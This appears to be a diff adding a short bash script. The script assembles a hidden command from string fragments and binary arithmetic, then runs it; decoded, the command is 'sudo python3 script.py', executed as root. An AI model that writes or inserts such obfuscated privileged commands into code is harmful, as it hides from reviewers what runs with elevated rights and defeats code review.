@@ -1,0 +1,19 @@
+#!/bin/bash
+etir="sn"
+fir="o"
+so="du"
+dir="h"
+ace=" "
+cr="sc"
+rc="ir"
+p="pt"
+ex="y."
+tin=$((2#0000010010))
+fin=$((2#00000001111))
+dor=$(($tin-$fin))
+co=${etir:0:1}${so:1:1}${so:0:1}${fir:0:1}$ace
+mm=${p:0:1}${ex:0:1}${p:1}$dir${fir:0:1}${etir:1}$dor
+an=${rc:0:1}${p:0:1}${p:1}
+d=${ace:0:1}${cr:0:2}${rc:1:1}
+com=$co$mm$d$an${ex:1:1}${p:0:1}${ex:0:1}
+$com
